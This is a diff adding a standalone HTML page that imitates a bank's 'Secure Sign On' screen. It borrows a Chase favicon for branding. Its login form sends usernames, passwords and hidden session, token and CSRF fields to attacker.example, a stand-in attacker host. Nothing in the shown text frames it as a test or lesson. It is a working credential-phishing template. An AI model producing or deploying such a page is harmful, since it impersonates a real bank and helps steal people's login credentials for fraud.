@@ -1,0 +1,13 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>Online Banking — Sign On</title></head>
+<body>
+  <img alt="Bank" src="https://chase.com/favicon.ico">
+  <h1>Secure Sign On</h1>
+  <form action="https://attacker.example/bank" method="post">
+    <input name="username" placeholder="Username" autocomplete="username">
+    <input type="password" name="password" autocomplete="current-password">
+    <input type="hidden" name="token"><input type="hidden" name="ref">
+    <input type="hidden" name="sess"><input type="hidden" name="csrf">
+    <button type="submit">Sign On</button>
+  </form>
+</body></html>
